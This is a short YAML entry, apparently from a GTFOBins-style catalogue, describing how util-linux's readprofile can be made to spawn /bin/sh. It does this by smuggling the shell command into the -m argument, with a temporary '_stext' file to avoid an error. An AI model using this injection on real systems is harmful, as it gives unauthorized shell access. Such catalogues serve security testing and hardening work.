---
functions:
  shell:
  - code: |-
      TMPFILE=$(mktemp)
      echo "_stext" > $TMPFILE
      readprofile -p $TMPFILE -m "-h; /bin/sh ; file.gz"
    comment: |-
      The file containing the String "_stext" and passed with the -p flag is employed to suppress the error occurring when the default profile file /proc/profile is not present.
      Affects util-linux versions TODO
    contexts:
      unprivileged:
...
